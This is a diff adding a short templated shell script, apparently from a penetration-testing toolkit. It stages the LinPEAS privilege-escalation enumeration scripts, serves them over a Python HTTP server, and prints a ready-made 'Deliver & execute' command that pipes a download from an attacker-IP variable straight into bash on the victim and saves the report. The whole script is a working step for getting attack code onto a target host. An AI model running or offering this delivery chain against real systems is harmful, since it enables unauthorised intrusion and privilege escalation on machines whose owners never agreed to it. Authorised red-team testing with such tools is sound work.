@@ -1,0 +1,6 @@
+mkdir -p packstation/outbound; cp -n /usr/share/peass/linpeas/* packstation/outbound/; \
+echo '================================================================'; \
+echo '                       -----Linux------                         '; \
+echo 'Deliver & execute: curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/linpeas.sh | bash > <%=$(esh variables/delivery_path_linux)%>/report.txt'; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
